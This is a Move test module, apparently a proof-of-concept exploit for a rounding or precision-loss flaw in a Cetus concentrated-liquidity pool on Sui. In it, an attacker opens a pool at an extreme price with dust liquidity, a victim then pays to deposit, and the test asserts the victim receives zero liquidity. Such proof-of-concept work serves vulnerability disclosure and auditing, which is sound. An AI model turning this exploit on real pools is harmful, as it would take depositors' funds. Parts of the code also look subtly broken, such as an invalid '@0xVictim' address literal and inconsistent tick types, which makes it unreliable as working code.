#[test_only]
module cetus_clmm::poc_exploit {
    use sui::test_scenario::{Self as ts};
    use sui::clock::{Self};
    use sui::balance::{Self};
    use sui::coin::{Self};
    use cetus_clmm::pool;
    use cetus_clmm::config;
    use cetus_clmm::tick_math;
    use cetus_clmm::position;
    use integer_mate::i32; 

    public struct COIN_A has drop {}
    public struct COIN_B has drop {}

    // Addresses
    const ADMIN: address = @0xAD;
    const ATTACKER: address = @0x1337;
    const VICTIM: address = @0xVictim;

    // CONFIGURATION
    const EXTREME_SQRT_PRICE: u128 = 70000000000000000000000000000; 
    const VICTIM_AMOUNT: u64 = 2; // Amount 2 to prove rounding to 0
    const DUST_LIQUIDITY: u128 = 1;

    #[test]
    fun test_precision_loss() {
        let mut scenario = ts::begin(ADMIN);
        let ctx = ts::ctx(&mut scenario);
        let clock = clock::create_for_testing(ctx);

        ts::next_tx(&mut scenario, ADMIN);
        let (admin_cap, mut config) = config::new_global_config_for_test(ts::ctx(&mut scenario), 1000); 

        // 1. ATTACKER CREATES POOL
        ts::next_tx(&mut scenario, ATTACKER);
        {
            let ctx = ts::ctx(&mut scenario);
            let mut pool = pool::new_for_test<COIN_A, COIN_B>(
                60, EXTREME_SQRT_PRICE, 3000, 
                std::string::utf8(b"test_pool"), 0, &clock, ctx
            );

            let current_tick = tick_math::get_tick_at_sqrt_price(EXTREME_SQRT_PRICE);
            let tick_lower_val = (i32::as_u32(current_tick) / 60) * 60;
            let tick_upper_val = tick_lower_val + 60;

            let mut position = pool::open_position(
                &config, &mut pool, 
                i32::from(tick_lower_val).to_u32(), 
                i32::from(tick_upper_val).to_u32(), ctx
            );

            let receipt = pool::add_liquidity(
                &config, &mut pool, &mut position, DUST_LIQUIDITY, &clock
            );

            let (amt_a, amt_b) = pool::add_liquidity_pay_amount(&receipt);
            let bal_a = balance::create_for_testing<COIN_A>(amt_a);
            let bal_b = balance::create_for_testing<COIN_B>(amt_b);
            
            pool::repay_add_liquidity(&config, &mut pool, bal_a, bal_b, receipt);

            sui::transfer::public_share_object(pool);
            sui::transfer::public_transfer(position, ATTACKER);
        };

        // 2. VICTIM DEPOSITS
        ts::next_tx(&mut scenario, VICTIM);
        {
            let mut pool = ts::take_shared<pool::Pool<COIN_A, COIN_B>>(&scenario);
            let ctx = ts::ctx(&mut scenario);
            
            let current_tick = pool::current_tick_index(&pool);
            let tick_lower_val = (i32::as_u32(current_tick) / 60) * 60;
            let tick_upper_val = tick_lower_val + 60;

            let mut victim_pos = pool::open_position(
                &config, &mut pool, tick_lower_val, tick_upper_val, ctx
            );

            let victim_receipt = pool::add_liquidity_fix_coin(
                &config, &mut pool, &mut victim_pos, 
                VICTIM_AMOUNT, true, &clock
            );

            let (req_a, req_b) = pool::add_liquidity_pay_amount(&victim_receipt);
            let pay_a = balance::create_for_testing<COIN_A>(req_a);
            let pay_b = balance::create_for_testing<COIN_B>(req_b);

            pool::repay_add_liquidity(&config, &mut pool, pay_a, pay_b, victim_receipt);

            // 3. ASSERTION
            let liquidity_received = position::liquidity(&victim_pos);
            
            // IF PASS: Bug is VALID (Liquidity is 0 despite payment)
            assert!(liquidity_received == 0, 1004); 

            position::close_position(&config, &mut pool, victim_pos);
            ts::return_shared(pool);
        };

        clock::destroy_for_testing(clock);
        sui::transfer::public_transfer(admin_cap, ADMIN);
        sui::transfer::public_share_object(config);
        ts::end(scenario);
    }
}
